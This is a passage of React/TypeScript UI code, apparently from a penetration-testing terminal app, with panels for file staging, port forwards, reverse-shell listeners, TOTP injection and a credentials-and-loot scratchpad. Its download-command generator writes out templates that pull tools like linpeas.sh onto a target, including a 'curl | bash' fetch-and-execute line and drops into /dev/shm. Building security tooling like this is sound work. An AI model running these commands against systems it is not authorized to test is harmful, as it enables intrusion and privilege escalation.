                        <span>{sidebarTransferBusy ? 'Starting...' : `Start HTTP Server (:${sidebarTransferPort})`}</span>
                      </button>
                    ) : (
                      <div style={{ display: 'flex', gap: '0.3rem' }}>
                        <button
                          type="button"
                          className="cyber-hud-btn btn-secondary btn-sm"
                          style={{ flex: 1, fontSize: '0.66rem', justifyContent: 'center' }}
                          onClick={() => {
                            if (sidebarTransferExtCmd && navigator.clipboard?.writeText) {
                              void navigator.clipboard.writeText(sidebarTransferExtCmd);
                              setStatusMessage('Copied server command to clipboard.');
                            }
                          }}
                        >
                          <CyberIcon name="copy" size={11} />
                          <span>Copy Cmd</span>
                        </button>
                        <button
                          type="button"
                          className="cyber-hud-btn btn-primary btn-sm"
                          style={{ flex: 1, fontSize: '0.66rem', justifyContent: 'center' }}
                          onClick={() => {
                            const api = getWailsBindings();
                            if (api?.OpenLocalTerminal && sidebarTransferExtCmd) {
                              void api.OpenLocalTerminal('powershell', { cols: 120, rows: 34 }).then((sid) => {
                                openSessionTab(sid, 'File Staging Server', undefined, '#10b981');
                                setTimeout(() => {
                                  void api.WriteTerminal?.(sid, `${sidebarTransferExtCmd}\n`);
                                }, 400);
                              });
                            }
                          }}
                        >
                          <CyberIcon name="terminal" size={11} />
                          <span>Run Local</span>
                        </button>
                      </div>
                    )}

                    {/* Active Running Staging Servers Monitor */}
                    {dashboardFileServers.length > 0 && (
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.28rem', marginTop: '0.1rem' }}>
                        {dashboardFileServers.map((srv) => (
                          <div
                            key={srv.id}
                            style={{
                              background: 'rgba(16, 185, 129, 0.1)',
                              border: '1px solid rgba(16, 185, 129, 0.38)',
                              borderRadius: '3px',
                              padding: '4px 6px',
                              fontSize: '0.66rem',
                              color: '#6ee7b7',
                              display: 'flex',
                              flexDirection: 'column',
                              gap: '2px',
                            }}
                          >
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '4px' }}>
                              <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', fontWeight: 700 }}>
                                :{srv.port} · GET {srv.servedCount} · UP {srv.uploadCount}
                              </span>
                              <button
                                type="button"
                                className="drawer-action-btn"
                                style={{ color: '#f87171', padding: '1px 5px', fontSize: '0.62rem' }}
                                onClick={() => {
                                  void getWailsBindings()?.StopFileTransferServer?.(srv.id).then(() => {
                                    void getWailsBindings()?.ListFileTransferServers?.().then((s) => setDashboardFileServers(s || []));
                                  });
                                }}
                              >
                                Stop
                              </button>
                            </div>
                            <div style={{ fontSize: '0.61rem', color: '#94a3b8', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                              {srv.directory}
                            </div>
                            {srv.recentEvents && srv.recentEvents.length > 0 && (
                              <div style={{ fontFamily: 'monospace', fontSize: '0.6rem', color: '#cbd5e1', background: 'rgba(2, 6, 23, 0.65)', padding: '2px 4px', borderRadius: 2 }}>
                                {srv.recentEvents.slice(-2).reverse().map((ev, i) => (
                                  <div key={i} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                    [{ev.status}] {ev.method} {ev.path}
                                  </div>
                                ))}
                              </div>
                            )}
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* MIDDLE: Folder & File Picker */}
                  <div
                    style={{
                      padding: '0.55rem 0.75rem',
                      borderBottom: '1px solid color-mix(in srgb, var(--accent-bright) 16%, transparent)',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '0.35rem',
                      flex: 1,
                      minHeight: 0,
                      overflow: 'hidden',
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontSize: '0.67rem', fontWeight: 700, color: 'var(--accent-bright)', letterSpacing: '0.07em' }}>
                        FILES &amp; FOLDERS ({sidebarTransferFiles.length})
                      </span>
                      <button
                        type="button"
                        className="drawer-action-btn"
                        style={{ padding: '1px 6px', fontSize: '0.62rem' }}
                        disabled={!sidebarTransferDir || sidebarTransferDir === '/' || /^[A-Za-z]:[\\/]?$/.test(sidebarTransferDir)}
                        onClick={() => {
                          const trimmed = sidebarTransferDir.replace(/[\\/]+$/, '');
                          const sepIdx = Math.max(trimmed.lastIndexOf('/'), trimmed.lastIndexOf('\\'));
                          if (sepIdx <= 0) return;
                          let parent = trimmed.slice(0, sepIdx);
                          if (/^[A-Za-z]:$/.test(parent)) parent += '\\';
                          setSidebarTransferDir(parent);
                          const api = getWailsBindings();
                          if (api?.ListHostedTransferFiles) {
                            setSidebarTransferLoadingFiles(true);
                            void api.ListHostedTransferFiles(parent)
                              .then((files) => setSidebarTransferFiles(files || []))
                              .catch(() => { })
                              .finally(() => setSidebarTransferLoadingFiles(false));
                          }
                        }}
                        title="Go to parent folder"
                      >
                        .. Up
                      </button>
                    </div>

                    <div style={{ flex: 1, minHeight: 0, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.24rem' }}>
                      {sidebarTransferLoadingFiles ? (
                        <div style={{ fontSize: '0.68rem', color: '#94a3b8' }}>Loading folder...</div>
                      ) : sidebarTransferFiles.length === 0 ? (
                        <div style={{ fontSize: '0.68rem', color: '#64748b' }}>Empty folder or type custom filename below.</div>
                      ) : (
                        sidebarTransferFiles.map((f) => {
                          const fileKey = f.relPath || f.name;
                          const isSelected = !f.isDir && sidebarTransferSelectedFile === fileKey;
                          return (
                            <button
                              key={fileKey}
                              type="button"
                              onClick={() => {
                                if (f.isDir) {
                                  const nextDir = f.fullPath || `${sidebarTransferDir.replace(/[\\/]+$/, '')}/${f.name}`;
                                  setSidebarTransferDir(nextDir);
                                  const api = getWailsBindings();
                                  if (api?.ListHostedTransferFiles) {
                                    setSidebarTransferLoadingFiles(true);
                                    void api.ListHostedTransferFiles(nextDir)
                                      .then((files) => setSidebarTransferFiles(files || []))
                                      .catch(() => { })
                                      .finally(() => setSidebarTransferLoadingFiles(false));
                                  }
                                } else {
                                  setSidebarTransferSelectedFile(fileKey);
                                  const api = getWailsBindings();
                                  if (api?.HashHostedTransferFile) {
                                    void api.HashHostedTransferFile(sidebarTransferDir, fileKey).then((hashed) => {
                                      setSidebarTransferSelectedHashes({
                                        filename: hashed.relPath || hashed.name,
                                        sha256: hashed.sha256 || '',
                                        md5: hashed.md5 || '',
                                        size: hashed.size,
                                      });
                                    }).catch(() => { });
                                  }
                                }
                              }}
                              style={{
                                display: 'flex',
                                justifyContent: 'space-between',
                                alignItems: 'center',
                                width: '100%',
                                textAlign: 'left',
                                padding: '4px 6px',
                                borderRadius: '3px',
                                cursor: 'pointer',
                                background: isSelected ? 'color-mix(in srgb, var(--accent-bright) 16%, transparent)' : 'rgba(15, 23, 42, 0.6)',
                                border: isSelected ? '1px solid color-mix(in srgb, var(--accent-bright) 65%, transparent)' : '1px solid rgba(148, 163, 184, 0.16)',
                                color: f.isDir ? 'var(--accent-bright)' : '#e2e8f0',
                                fontSize: '0.69rem',
                                fontFamily: 'JetBrains Mono, monospace',
                              }}
                            >
                              <span style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', minWidth: 0, overflow: 'hidden' }}>
                                <CyberIcon name={f.isDir ? 'folder' : 'file'} size={12} />
                                <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{f.name}</span>
                              </span>
                              <span style={{ fontSize: '0.61rem', color: '#94a3b8', flexShrink: 0, marginLeft: '4px' }}>
                                {f.isDir ? 'DIR' : f.size < 1024 ? `${f.size}B` : `${(f.size / 1024).toFixed(1)}K`}
                              </span>
                            </button>
                          );
                        })
                      )}
                    </div>
                  </div>

                  {/* BOTTOM: Quick Target One-Liner */}
                  <div style={{ padding: '0.55rem 0.75rem', display: 'flex', flexDirection: 'column', gap: '0.35rem', flexShrink: 0 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontSize: '0.66rem', fontWeight: 700, color: '#34d399', letterSpacing: '0.07em' }}>
                        QUICK DOWNLOAD CMD
                      </span>
                      <div style={{ display: 'flex', gap: '0.2rem' }}>
                        {(['linux', 'windows'] as const).map((os) => (
                          <button
                            key={os}
                            type="button"
                            className={`cyber-pill-btn ${sidebarTransferTargetOs === os ? 'active' : ''}`}
                            style={{ padding: '1px 6px', fontSize: '0.62rem' }}
                            onClick={() => setSidebarTransferTargetOs(os)}
                          >
                            {os === 'linux' ? 'Linux' : 'Windows'}
                          </button>
                        ))}
                      </div>
                    </div>

                    {sidebarTransferLocalIPs.length > 0 && (
                      <div style={{ display: 'flex', gap: '0.2rem', flexWrap: 'wrap' }}>
                        {sidebarTransferLocalIPs.slice(0, 3).map((ipItem) => (
                          <button
                            key={`${ipItem.interface}-${ipItem.ip}`}
                            type="button"
                            className={`cyber-pill-btn ${sidebarTransferLhost === ipItem.ip ? 'active' : ''}`}
                            style={{ fontSize: '0.6rem', padding: '1px 5px' }}
                            onClick={() => setSidebarTransferLhost(ipItem.ip)}
                          >
                            {ipItem.isVpn ? ipItem.interface : ipItem.ip}
                          </button>
                        ))}
                      </div>
                    )}

                    <input
                      type="text"
                      className="cyber-hud-input"
                      aria-label="Sidebar Staged Filename"
                      value={sidebarTransferSelectedFile}
                      onChange={(e) => setSidebarTransferSelectedFile(e.target.value)}
                      placeholder="linpeas.sh"
                      style={{ fontSize: '0.68rem' }}
                    />

                    {sidebarTransferTargetOs === 'linux' && (
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '0.25rem', flexWrap: 'wrap' }}>
                        <div style={{ display: 'flex', gap: '0.2rem' }} aria-label="Linux Download Tool">
                          {(
                            [
                              { id: 'curl', label: 'curl' },
                              { id: 'wget', label: 'wget' },
                              { id: 'memory', label: 'curl | bash' },
                            ] as const
                          ).map((tool) => (
                            <button
                              key={tool.id}
                              type="button"
                              className={`cyber-pill-btn ${sidebarTransferTool === tool.id ? 'active' : ''}`}
                              style={{ padding: '1px 5px', fontSize: '0.6rem' }}
                              onClick={() => setSidebarTransferTool(tool.id)}
                            >
                              {tool.label}
                            </button>
                          ))}
                        </div>
                        {sidebarTransferTool !== 'memory' && (
                          <div style={{ display: 'flex', gap: '0.2rem' }} aria-label="Linux Target Directory">
                            {(
                              [
                                { dir: '.', label: 'Current (.)' },
                                { dir: '/dev/shm', label: '/dev/shm' },
                                { dir: '/tmp', label: '/tmp' },
                              ] as const
                            ).map((d) => (
                              <button
                                key={d.dir}
                                type="button"
                                className={`cyber-pill-btn ${sidebarTransferDestDir === d.dir ? 'active' : ''}`}
                                style={{ padding: '1px 5px', fontSize: '0.6rem' }}
                                onClick={() => setSidebarTransferDestDir(d.dir)}
                              >
                                {d.label}
                              </button>
                            ))}
                          </div>
                        )}
                      </div>
                    )}

                    {(() => {
                      const fname = sidebarTransferSelectedFile || 'linpeas.sh';
                      const destPrefix = sidebarTransferDestDir === '.' ? '.' : sidebarTransferDestDir;
                      const fallbackCmd =
                        sidebarTransferTargetOs === 'windows'
                          ? `iwr -Uri http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname} -OutFile .\${fname}`
                          : sidebarTransferTool === 'wget'
                            ? `wget -q "http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname}" -O "${destPrefix}/${fname}" && chmod +x "${destPrefix}/${fname}"`
                            : sidebarTransferTool === 'memory'
                              ? `curl -fsSL "http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname}" | bash`
                              : `curl -fsSL "http://${sidebarTransferLhost}:${sidebarTransferPort}/${fname}" -o "${destPrefix}/${fname}" && chmod +x "${destPrefix}/${fname}"`;
                      const wantedId =
                        sidebarTransferTargetOs === 'linux'
                          ? sidebarTransferTool === 'wget'
                            ? 'linux-wget'
                            : sidebarTransferTool === 'memory'
                              ? 'linux-curl-mem'
                              : 'linux-curl'
                          : '';
                      const pickedMethod =
                        (wantedId && sidebarTransferCmdSet?.methods?.find((m) => m.id === wantedId)) ||
                        sidebarTransferCmdSet?.methods?.find((m) => m.category === 'download') ||
                        sidebarTransferCmdSet?.methods?.[0];
                      const cmd = pickedMethod?.command || fallbackCmd;
                      return (
                        <div className="drawer-card" style={{ padding: '0.45rem' }}>
                          <pre
                            style={{
                              margin: '0 0 0.4rem 0',
                              fontSize: '0.66rem',
                              fontFamily: 'JetBrains Mono, monospace',
                              color: 'var(--accent-bright)',
                              whiteSpace: 'pre-wrap',
                              wordBreak: 'break-all',
                              background: 'rgba(2, 6, 23, 0.75)',
                              padding: '0.35rem',
                              border: '1px solid color-mix(in srgb, var(--accent-bright) 18%, transparent)',
                              maxHeight: '58px',
                              overflowY: 'auto',
                            }}
                          >
                            {cmd}
                          </pre>
                          <div className="drawer-card-actions">
                            <button
                              type="button"
                              className="drawer-action-btn"
                              onClick={() => {
                                if (cmd && navigator.clipboard?.writeText) {
                                  void navigator.clipboard.writeText(cmd);
                                  setStatusMessage('Copied download command to clipboard.');
                                }
                              }}
                            >
                              <CyberIcon name="copy" size={11} />
                              <span>Copy</span>
                            </button>
                            <button
                              type="button"
                              className="drawer-action-btn"
                              disabled={!sessionId}
                              onClick={() => {
                                if (sessionId && cmd) void getWailsBindings()?.WriteTerminal?.(sessionId, cmd);
                              }}
                            >
                              <CyberIcon name="terminal" size={11} />
                              <span>Insert</span>
                            </button>
                            <button
                              type="button"
                              className="drawer-action-btn run-btn"
                              disabled={!sessionId}
                              onClick={() => {
                                if (sessionId && cmd) void getWailsBindings()?.WriteTerminal?.(sessionId, `${cmd}\n`);
                              }}
                            >
                              <CyberIcon name="play" size={11} />
                              <span>Run</span>
                            </button>
                          </div>
                        </div>
                      );
                    })()}
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'forwards' && (
                <div className="drawer-panel drawer-forwards-panel">
                  <div className="sidebar-header">
                    <h2>Port Forwards</h2>
                    <div className="sidebar-actions" style={{ display: 'flex', gap: '4px' }}>
                      <button
                        type="button"
                        className="btn-secondary btn-sm"
                        onClick={() => void refreshForwardState()}
                        title="Refresh forward rules and tunnel status"
                      >
                        <CyberIcon name="refresh" size={11} />
                      </button>
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowPortForwardingModal(true)}
                        title="Create or edit port forwarding rules (F-13)"
                      >
                        + Rules
                      </button>
                    </div>
                  </div>
                  <div className="drawer-filter-bar">
                    <input
                      type="text"
                      className="drawer-search-input"
                      placeholder="Filter forwards, ports, or hosts..."
                      value={forwardsDrawerQuery}
                      onChange={(e) => setForwardsDrawerQuery(e.target.value)}
                      aria-label="Filter Port Forwards"
                    />
                  </div>
                  <div className="drawer-items-list">
                    {(() => {
                      const q = forwardsDrawerQuery.trim().toLowerCase();
                      const activeOnlyAdhoc = activeTunnels.filter((t) => {
                        const tHostLabel = vaultSummary.hosts.find((h) => h.id === t.hostId)?.label || '';
                        return (
                          t.status === 'active' &&
                          !forwardRules.some((r) => r.id === t.ruleId || r.id === t.id) &&
                          (!q ||
                            String(t.bindPort).includes(q) ||
                            String(t.targetPort || '').includes(q) ||
                            (t.targetHost || '').toLowerCase().includes(q) ||
                            tHostLabel.toLowerCase().includes(q))
                        );
                      });
                      const matchingRules = forwardRules.filter((r) => {
                        if (!q) return true;
                        const hostLabel = vaultSummary.hosts.find((h) => h.id === r.hostId)?.label || '';
                        return (
                          (r.label || '').toLowerCase().includes(q) ||
                          String(r.bindPort).includes(q) ||
                          String(r.targetPort || '').includes(q) ||
                          (r.targetHost || '').toLowerCase().includes(q) ||
                          hostLabel.toLowerCase().includes(q) ||
                          r.type.toLowerCase().includes(q)
                        );
                      });

                      if (matchingRules.length === 0 && activeOnlyAdhoc.length === 0) {
                        return (
                          <div className="drawer-empty-state">
                            <span>No port forward rules match.</span>
                            <button
                              type="button"
                              className="cyber-hud-btn btn-primary btn-sm"
                              style={{ marginTop: '0.5rem', display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                              onClick={() => setShowPortForwardingModal(true)}
                            >
                              <CyberIcon name="tunnel" size={12} />
                              <span>New Forward Rule</span>
                            </button>
                          </div>
                        );
                      }

                      const sshPanes = tabs.flatMap((t) =>
                        collectPanes(t.rootNode).filter(
                          (p) =>
                            Boolean(p.hostId) &&
                            !p.paneType &&
                            !p.isRawTcp &&
                            !p.sessionId.startsWith('local-') &&
                            !p.sessionId.startsWith('serial-') &&
                            !p.sessionId.startsWith('winrm-') &&
                            !p.sessionId.startsWith('rawtcp-')
                        )
                      );
                      const preferredSshSid =
                        (activePane && sshPanes.some((p) => p.sessionId === activePane.sessionId)
                          ? activePane.sessionId
                          : sshPanes[0]?.sessionId) || '';

                      return (
                        <>
                          {activeOnlyAdhoc.map((tun) => {
                            const tunHostLabel = vaultSummary.hosts.find((h) => h.id === tun.hostId)?.label;
                            return (
                              <div key={tun.id} className="drawer-card">
                                <div className="drawer-card-header">
                                  <span className="drawer-card-title">
                                    -{tun.type} Quick Tunnel ({tunHostLabel || 'SSH'})
                                  </span>
                                  <span className="drawer-badge" style={{ color: '#34d399', borderColor: 'rgba(52, 211, 153, 0.45)' }}>
                                    ACTIVE
                                  </span>
                                </div>
                                <div className="drawer-card-meta">
                                  <span>
                                    {tun.bindAddress || '127.0.0.1'}:{tun.bindPort}
                                    {tun.type === 'D' ? ' (SOCKS5)' : ` -> ${tun.targetHost}:${tun.targetPort}`}
                                  </span>
                                </div>
                                <div className="drawer-card-actions">
                                  <button
                                    type="button"
                                    className="drawer-action-btn danger"
                                    onClick={() => void handleStopForwardTunnel(tun.id)}
                                    title="Stop active tunnel"
                                  >
                                    <CyberIcon name="stop" size={12} />
                                    <span>Stop</span>
                                  </button>
                                </div>
                              </div>
                            );
                          })}
                          {matchingRules.map((rule) => {
                            const host = vaultSummary.hosts.find((h) => h.id === rule.hostId);
                            const runningTun = activeTunnels.find(
                              (t) => t.status === 'active' && (t.ruleId === rule.id || t.id === rule.id)
                            );
                            const mapping =
                              rule.type === 'D'
                                ? `${rule.bindAddress || '127.0.0.1'}:${rule.bindPort} (SOCKS5)`
                                : `${rule.bindAddress || '127.0.0.1'}:${rule.bindPort} -> ${rule.targetHost}:${rule.targetPort}`;

                            return (
                              <div key={rule.id} className="drawer-card">
                                <div className="drawer-card-header">
                                  <span className="drawer-card-title">
                                    -{rule.type} {rule.label || mapping}
                                  </span>
                                  <span
                                    className="drawer-badge"
                                    style={
                                      runningTun
                                        ? { color: '#34d399', borderColor: 'rgba(52, 211, 153, 0.45)' }
                                        : undefined
                                    }
                                  >
                                    {runningTun ? 'ACTIVE' : 'STOPPED'}
                                  </span>
                                </div>
                                <div className="drawer-card-meta">
                                  <span>{mapping}</span>
                                  {host && <span>HOST: {host.label}</span>}
                                </div>
                                <div className="drawer-card-actions">
                                  {runningTun ? (
                                    <button
                                      type="button"
                                      className="drawer-action-btn danger"
                                      onClick={() => void handleStopForwardTunnel(runningTun.id)}
                                      title="Stop active forward tunnel"
                                    >
                                      <CyberIcon name="stop" size={12} />
                                      <span>Stop</span>
                                    </button>
                                  ) : (
                                    <button
                                      type="button"
                                      className="drawer-action-btn primary"
                                      onClick={() => {
                                        if (rule.hostId) {
                                          void handleStartTunnelWithHost(rule.hostId, rule.id);
                                        } else if (preferredSshSid) {
                                          void handleStartForwardTunnel(preferredSshSid, rule.id);
                                        } else {
                                          setStatusMessage('Connect an SSH host or assign a host to this forward rule.');
                                          setShowPortForwardingModal(true);
                                        }
                                      }}
                                      title={
                                        rule.hostId
                                          ? `Start tunnel via ${host?.label || rule.hostId}`
                                          : preferredSshSid
                                            ? 'Start tunnel on active SSH session'
                                            : 'Open manager to pick SSH session'
                                      }
                                    >
                                      <CyberIcon name="play" size={12} />
                                      <span>Start</span>
                                    </button>
                                  )}
                                  <button
                                    type="button"
                                    className="drawer-action-btn"
                                    onClick={() => {
                                      setForwardingModalHostId(rule.hostId || undefined);
                                      setShowPortForwardingModal(true);
                                    }}
                                    title="Edit rule in Port Forwarding Manager"
                                  >
                                    <CyberIcon name="edit" size={12} />
                                    <span>Edit</span>
                                  </button>
                                </div>
                              </div>
                            );
                          })}
                        </>
                      );
                    })()}
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'listeners' && (
                <div className="drawer-panel drawer-listeners-panel">
                  <div className="sidebar-header">
                    <h2>Active Listeners</h2>
                    <div className="sidebar-actions" style={{ display: 'flex', gap: '4px' }}>
                      <button
                        type="button"
                        className="btn-secondary btn-sm"
                        onClick={openRouteHealthTab}
                        title="Open Unified Listeners & Route Health Dashboard View"
                      >
                        Dashboard
                      </button>
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowListenerManagerModal(true)}
                        title="Open Unified Listener Manager"
                      >
                        + Listeners
                      </button>
                    </div>
                  </div>
                  <div className="drawer-items-list">
                    {drawerListeners.length === 0 ? (
                      <div className="drawer-empty-state">
                        <span>No listeners currently active.</span>
                        <button
                          type="button"
                          className="cyber-hud-btn btn-primary btn-sm"
                          style={{ marginTop: '0.5rem', display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                          onClick={() => setShowListenerManagerModal(true)}
                        >
                          <CyberIcon name="radar" size={12} />
                          <span>Launch Listener</span>
                        </button>
                      </div>
                    ) : (
                      drawerListeners.map((l) => (
                        <div key={l.id} className="drawer-card">
                          <div className="drawer-card-header">
                            <span className="drawer-card-title">{l.name || l.id}</span>
                            <span className="drawer-badge">{l.status?.toUpperCase() || 'LISTENING'}</span>
                          </div>
                          <div className="drawer-card-meta">
                            <span>PORT: {l.bindPort}</span>
                            <span>TOOL: {l.tool?.toUpperCase()}</span>
                            <span>CATCHES: {l.catchCount || 0}</span>
                          </div>
                          <div className="drawer-card-actions">
                            {l.activeSessions && l.activeSessions.length > 0 ? (
                              l.activeSessions.map((sess) => (
                                <button
                                  key={sess.id}
                                  type="button"
                                  className="drawer-action-btn"
                                  onClick={() => {
                                    setShellStabilizeModal({
                                      isOpen: true,
                                      sessionId: sess.id,
                                      sessionTitle: `Caught Shell (${sess.id})`,
                                      isRawTcp: true,
                                      cols: 80,
                                      rows: 24,
                                    });
                                  }}
                                  title="Stabilize caught shell"
                                >
                                  <CyberIcon name="stabilize" size={12} />
                                  <span>Stabilize ({sess.id.slice(0, 8)})</span>
                                </button>
                              ))
                            ) : (
                              <button
                                type="button"
                                className="drawer-action-btn"
                                onClick={() => setShowListenerManagerModal(true)}
                              >
                                <CyberIcon name="radar" size={12} />
                                <span>Details</span>
                              </button>
                            )}
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'notes' && (
                <div className="drawer-panel drawer-notes-panel">
                  <div className="sidebar-header">
                    <h2>Scratchpad &amp; Notes</h2>
                    <div className="sidebar-actions">
                      <button
                        type="button"
                        className="btn-secondary btn-sm"
                        onClick={() => {
                          const hostId = activeHostId || '';
                          const canonicalId = hostId ? `note-scratchpad-${hostId}` : 'note-scratchpad-global';
                          setNotesModalHostId(hostId || undefined);
                          setNotesModalInitialNoteId(canonicalId);
                          setShowNotesModal(true);
                        }}
                        title="Open full Host Notes editor"
                      >
                        Full View
                      </button>
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => void handleSaveScratchpadToHostNotes()}
                        title="Save scratchpad buffer into this host's scratchpad note"
                      >
                        Save
                      </button>
                    </div>
                  </div>
                  <div style={{ fontSize: '0.72rem', color: '#94a3b8', padding: '0.1rem 0 0.3rem 0' }}>
                    Target: <strong style={{ color: 'var(--accent-bright)' }}>{activeTab?.title || 'Global Workspace'}</strong>
                  </div>
                  <textarea
                    className="drawer-scratchpad-textarea"
                    value={scratchpadContent}
                    onChange={(e) => setScratchpadContent(e.target.value)}
                    placeholder="Paste loot, write command notes, dumped credentials..."
                    rows={12}
                  />
                  <div className="drawer-card-actions" style={{ marginTop: '0.4rem' }}>
                    <button
                      type="button"
                      className="drawer-action-btn"
                      onClick={() => {
                        void navigator.clipboard.writeText(scratchpadContent);
                        setStatusMessage('Copied scratchpad buffer to clipboard.');
                      }}
                    >
                      <CyberIcon name="copy" size={12} />
                      <span>Copy</span>
                    </button>
                    <button
                      type="button"
                      className="drawer-action-btn"
                      onClick={() => setScratchpadContent('')}
                    >
                      <CyberIcon name="trash" size={12} />
                      <span>Clear</span>
                    </button>
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'totp' && (
                <div className="drawer-panel drawer-totp-panel">
                  <div className="sidebar-header">
                    <h2>2FA / TOTP</h2>
                    <div className="sidebar-actions">
                      {sessionId && (
                        <button
                          type="button"
                          className="btn-secondary btn-sm"
                          onClick={() => void handleTerminalTotpClick()}
                          aria-label="2FA / TOTP"
                          title="Quick Inject 2FA code into active terminal"
                        >
                          Inject
                        </button>
                      )}
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowTotpModal(true)}
                        title="Open 2FA Authenticator Vault"
                      >
                        + 2FA Vault
                      </button>
                    </div>
                  </div>
                  <div style={{ fontSize: '0.72rem', color: '#94a3b8', padding: '0.1rem 0 0.35rem 0' }}>
                    Host: <strong style={{ color: 'var(--accent-bright)' }}>{activeTab?.title || 'Global Only'}</strong>
                  </div>
                  <div className="drawer-filter-bar">
                    <button
                      type="button"
                      className={`drawer-filter-btn ${totpDrawerScope === 'host_and_global' ? 'active' : ''}`}
                      onClick={() => setTotpDrawerScope('host_and_global')}
                    >
                      HOST + GLOBAL
                    </button>
                    <button
                      type="button"
                      className={`drawer-filter-btn ${totpDrawerScope === 'all' ? 'active' : ''}`}
                      onClick={() => setTotpDrawerScope('all')}
                    >
                      ALL TOKENS
                    </button>
                  </div>
                  <div className="drawer-items-list">
                    {(() => {
                      const allTokens = totpTokensList.length > 0 ? totpTokensList : (vaultSummary.totpRecords || []);
                      const visibleTokens = allTokens
                        .filter((t) => {
                          if (totpDrawerScope === 'all') return true;
                          return !t.hostId || (activeHostId && t.hostId === activeHostId);
                        })
                        .sort((a, b) => {
                          const aHost = activeHostId && a.hostId === activeHostId ? 1 : 0;
                          const bHost = activeHostId && b.hostId === activeHostId ? 1 : 0;
                          return bHost - aHost;
                        });

                      if (visibleTokens.length === 0) {
                        return (
                          <div className="drawer-empty-state">
                            <span>No 2FA authenticators configured for this scope.</span>
                            <button
                              type="button"
                              className="cyber-hud-btn btn-primary btn-sm"
                              style={{ marginTop: '0.5rem', display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                              onClick={() => setShowTotpModal(true)}
                            >
                              <CyberIcon name="totp" size={12} />
                              <span>Open 2FA Vault</span>
                            </button>
                          </div>
                        );
                      }

                      return visibleTokens.map((tok) => {
                        const codeResp = drawerTotpCodes[tok.id];
                        const rawCode = codeResp?.code || '------';
                        const digits = tok.digits || 6;
                        const mid = Math.floor(digits / 2);
                        const formattedCode =
                          rawCode.length === digits
                            ? `${rawCode.slice(0, mid)} ${rawCode.slice(mid)}`
                            : rawCode;
                        const remaining = codeResp ? codeResp.remainingSeconds : (tok.period || 30);
                        const isHostBound = Boolean(activeHostId && tok.hostId === activeHostId);

                        return (
                          <div key={tok.id} className="drawer-card">
                            <div className="drawer-card-header">
                              <span className="drawer-card-title">{tok.issuer || tok.label}</span>
                              <span
                                className="drawer-badge"
                                style={{
                                  borderColor: isHostBound ? 'color-mix(in srgb, var(--accent-bright) 50%, transparent)' : 'color-mix(in srgb, var(--accent-bright) 35%, transparent)',
                                  color: isHostBound ? 'var(--accent-bright)' : 'var(--accent-bright)',
                                }}
                              >
                                {isHostBound ? 'ACTIVE HOST' : tok.hostId ? 'HOST LINKED' : 'GLOBAL'}
                              </span>
                            </div>
                            {tok.issuer && tok.label && (
                              <div className="drawer-card-desc">{tok.label}</div>
                            )}
                            <div
                              style={{
                                display: 'flex',
                                justifyContent: 'space-between',
                                alignItems: 'center',
                                padding: '6px 8px',
                                background: 'rgba(2, 6, 14, 0.85)',
                                border: '1px solid color-mix(in srgb, var(--accent-bright) 22%, transparent)',
                                borderRadius: '3px',
                                marginTop: '4px',
                                fontFamily: 'JetBrains Mono, Consolas, monospace',
                              }}
                            >
                              <span
                                style={{
                                  fontSize: '0.96rem',
                                  fontWeight: 700,
                                  letterSpacing: '0.1em',
                                  color: remaining <= 5 ? '#f87171' : 'var(--accent-bright)',
                                }}
                              >
                                {formattedCode}
                              </span>
                              <span
                                style={{
                                  fontSize: '0.7rem',
                                  color: remaining <= 5 ? '#f87171' : '#94a3b8',
                                }}
                              >
                                {remaining}s
                              </span>
                            </div>
                            <div className="drawer-card-actions">
                              <button
                                type="button"
                                className="drawer-action-btn"
                                onClick={() => {
                                  if (codeResp?.code) {
                                    void navigator.clipboard.writeText(codeResp.code);
                                    setStatusMessage(`Copied 2FA code for ${tok.label}.`);
                                  }
                                }}
                                title="Copy TOTP code to clipboard"
                              >
                                <CyberIcon name="copy" size={12} />
                                <span>Copy</span>
                              </button>
                              <button
                                type="button"
                                className="drawer-action-btn run-btn"
                                onClick={() => void handleInjectTotp(tok.id)}
                                title="Inject 2FA code directly into active terminal prompt"
                              >
                                <CyberIcon name="bolt" size={12} />
                                <span>Inject</span>
                              </button>
                            </div>
                          </div>
                        );
                      });
                    })()}
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'credentials' && (
                <div className="drawer-panel drawer-creds-panel">
                  <div className="sidebar-header">
                    <h2>Credentials &amp; Loot</h2>
                    <div className="sidebar-actions">
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowCredStoreModal(true)}
                        title="Open Credential Pool Modal"
                      >
                        + Pool
                      </button>
                    </div>
                  </div>
                  <div style={{ fontSize: '0.7rem', color: '#94a3b8', padding: '0.1rem 0 0.35rem 0', display: 'flex', justifyContent: 'space-between', gap: '6px' }}>
